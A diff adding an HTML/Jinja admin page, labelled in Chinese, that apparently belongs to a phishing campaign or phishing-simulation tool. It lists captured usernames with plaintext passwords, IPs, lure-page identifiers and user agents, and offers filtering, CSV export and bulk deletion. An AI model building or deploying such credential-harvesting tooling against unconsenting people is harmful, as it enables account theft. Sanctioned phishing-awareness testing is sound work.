@@ -1,0 +1,41 @@
+<div style="display:flex;gap:40px;align-items:center;margin-bottom:20px;">
+	<div style="background:#f0f4fa;padding:18px 32px;border-radius:8px;box-shadow:0 2px 8px #e6eaf1;">
+		<div style="font-size:15px;color:#888;">凭证总数</div>
+		<div style="font-size:28px;font-weight:bold;color:#2a3b4d;">{{ cred_count }}</div>
+	</div>
+	<div style="background:#f0f4fa;padding:18px 32px;border-radius:8px;box-shadow:0 2px 8px #e6eaf1;">
+		<div style="font-size:15px;color:#888;">收信人总数</div>
+		<div style="font-size:28px;font-weight:bold;color:#2a3b4d;">{{ emp_count }}</div>
+	</div>
+</div>
+<h2>凭证列表</h2>
+<form method="get" style="margin-bottom:10px;">
+    用户名：<input type="text" name="username" value="{{ username }}" style="width:100px;">
+    IP：<input type="text" name="ip" value="{{ ip }}" style="width:100px;">
+    页面标识：<input type="text" name="scene" value="{{ scene }}" style="width:100px;">
+    <button type="submit">筛选</button>
+    <a href="{{ url_for('admin.creds_export') }}" style="margin-left:20px;">导出CSV</a>
+</form>
+<form method="post" onsubmit="return confirm('确定要删除选中项吗？');">
+<input type="hidden" name="action" value="delete">
+<table border="1" cellpadding="6" cellspacing="0" style="border-collapse:collapse;font-size:14px;min-width:900px;">
+	<tr style="background:#f0f4fa;">
+		<th><input type="checkbox" onclick="var cbs=document.querySelectorAll('[name=delete_ids]');for(var i=0;i<cbs.length;i++)cbs[i].checked=this.checked;"> </th>
+		<th>ID</th><th>用户名</th><th>明文密码</th><th>IP</th><th>时间</th><th>页面标识</th><th>User-Agent</th><th>扩展信息</th>
+	</tr>
+	{% for cred in creds %}
+	<tr style="background:{{ loop.index0%2==0 and '#fff' or '#f9fbfd' }};">
+		<td><input type="checkbox" name="delete_ids" value="{{ cred.id }}"></td>
+		<td>{{ cred.id }}</td>
+		<td>{{ cred.username }}</td>
+		<td>{{ cred.raw_password }}</td>
+		<td>{{ cred.ip }}</td>
+		<td>{{ cred.timestamp }}</td>
+		<td>{{ cred.scene }}</td>
+		<td style="max-width:200px;word-break:break-all;">{{ cred.user_agent }}</td>
+		<td style="max-width:120px;word-break:break-all;">{{ cred.extra_info }}</td>
+	</tr>
+	{% endfor %}
+</table>
+<button type="submit" style="margin-top:10px;">批量删除</button>
+</form>
